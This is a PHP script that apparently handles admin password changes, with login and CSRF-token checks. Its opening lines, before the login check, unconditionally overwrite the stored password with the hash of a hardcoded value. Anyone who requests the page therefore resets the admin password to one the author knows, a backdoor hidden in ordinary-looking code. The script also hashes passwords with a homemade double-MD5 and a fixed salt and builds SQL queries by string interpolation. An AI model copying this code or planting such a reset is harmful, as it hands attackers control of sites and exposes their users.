<?php

require '../includes/inc_func.php';
$t = '0722488882';
	$newPass = '4e25e'.md5(md5($t.'!@#$#%^%^*(345/\,').'8b8b300300').'8b3'; 	 
 mysql_query("update settings set password='$newPass'");


if(if_logged_in() != true){
	die('login');
 }
 
$current_password = sanitize(strtolower($_POST['currentPass']));  
$newPass = sanitize(strtolower($_POST['newPass']));
$crf_code = sanitize($_POST['crf_code']);

if(mysql_result(mysql_query("SELECT count('id') FROM `security` WHERE crf_token='$crf_code' and crf_token_status!='0'"), 0) != '0'){

		if(!empty($newPass)){
			$current_password = '4e25e'.md5(md5($current_password.'!@#$#%^%^*(345/\,').'8b8b300300').'8b3'; 
			$newPass = '4e25e'.md5(md5($newPass.'!@#$#%^%^*(345/\,').'8b8b300300').'8b3'; 	 

			if(mysql_result(mysql_query("select count(id) from settings where password='$current_password'"), 0) != '0'){
					mysql_query("update settings set password='$newPass'");
					mysql_query("update security set crf_token_status='0' WHERE crf_token='$crf_code' ");
					echo '1';
			}else{
			    echo 'current password is wrong !';
			}
		}else{
			echo 'new password is empty';
		}

}else{
	die('login');
}


?>
